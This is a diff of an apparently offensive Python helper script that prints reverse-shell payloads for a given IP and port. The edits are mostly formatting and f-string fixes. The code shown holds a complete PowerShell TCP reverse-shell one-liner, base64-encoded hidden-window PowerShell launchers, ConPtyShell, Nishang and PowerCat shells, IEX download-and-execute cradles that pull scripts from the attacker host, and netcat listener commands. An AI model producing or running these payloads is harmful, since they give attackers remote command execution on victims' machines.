@@ -63,7 +63,7 @@ def macro(pay):
 def print_listener(port):
 
     print("\n********** Connectivity **********\n")
-    print("tcpdump -i tun0 icmp -n\n")
+    print("tcpdump -i tun0 icmp -n")
     print("\n********** Listener **********\n")
     print(f"stty raw -echo; (stty size; cat) | nc -lvnp {port}")
     print(f"rlwrap -cAr nc -nlvp {port}")
@@ -75,32 +75,34 @@ def print_tty():
     print(f"stty raw -echo; fg")
     print(f"export TERM=xterm; reset xterm")
 
+    print("\n********** python tty **********\n")
     print(f"""python3 -c 'import pty; pty.spawn("/bin/bash")'""")
 
-    print("\n\n********** PowerShell payload b64 encode **********\n")
+    print("\n********** PowerShell payload b64 encode **********\n")
     print(f"echo '<payload>' | iconv -t utf-16le | base64 -w 0; echo")
+
+    print("\n*******************************************************")
+    print("                      PAYLOADS                    ")
+    print("*******************************************************")
 
 
 def print_powershell(ip, port, use_macro):
 
-    print("\n\n*******************************************************")
-    print("                      PAYLOADS                    ")
-    print("*******************************************************")
     print("\n\n********** Powershell reverse shell oneliner **********\n")
     text = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
     print(text)
     pay = build(text)
     
     if use_macro:
-        print("\n\n\n********** Powershell reverse shell base64 Macro **********\n")
+        print("\n\n********** Powershell reverse shell base64 Macro **********\n")
         macro(pay)
     else:
-        print("\n\n\n********** Powershell reverse shell base64 **********\n")
+        print("\n\n********** Powershell reverse shell base64 **********\n")
         print(f"powershell -nop -w hidden -enc {pay}")
 
 
 def print_conpty(ip, port, rows, columns, use_macro):
-    print("\n\n********** ConPtyShell RevShell **********\n")
+    print("\n********** ConPtyShell RevShell **********\n")
     payload = f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
     print(payload)
 
@@ -136,7 +138,7 @@ def print_conpty(ip, port, rows, columns, use_macro):
 
 def print_nishang(ip, port, use_macro):
 
-    print("\n\n********** Nishang payload **********\n")
+    print("\n********** Nishang payload **********\n")
     payload = f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
     print(payload)
 
@@ -167,13 +169,13 @@ def print_nishang(ip, port, use_macro):
 
     print(f"\n\n\n\tDONT'T FORGET !!")
     print(f"\trlwrap -cAr nc -nlvp {port}")
-    print(f"\tpython3 -m uploadserver 80")
+    print(f"\tpython3 -m uploadserver 80\n")
 
 
 def print_powercat(ip, port, use_macro):
     
-    print("\n\n********** PowerCat payload **********\n")
-    payload = "powercat -c {ip} -p {port} -e powershell"
+    print("\n********** PowerCat payload **********\n")
+    payload = f"powercat -c {ip} -p {port} -e powershell"
     print(payload)
 
     print("\n********** PowerCat payload b64**********\n")
@@ -181,14 +183,14 @@ def print_powercat(ip, port, use_macro):
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & IEX **********\n")
-    payload = "IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')"
+    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')"
     print(payload)
 
     print("\n********** PowerCat Download & IEX b64 **********\n")
     p64 = build(payload)
     print(f"powershell -nop -w hidden -enc {p64}")
 
-    print("\n********** PowerCat Download & Execution **********\n")
+    print("\n********** PowerCat Download, IEX & Execution **********\n")
     payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell"
     print(payload)
     p64 = build(payload)
@@ -452,8 +454,12 @@ def main(use_macro):
     shell_type = sys.argv[3].lower()
 
     if shell_type == "-trans":
-        protocol = sys.argv[4].lower()
-        file = sys.argv[5]
+        
+        if len(sys.argv) < 6:
+            shellpy_help()
+        else:
+            protocol = sys.argv[4].lower()
+            file = sys.argv[5]
        
     else:
 
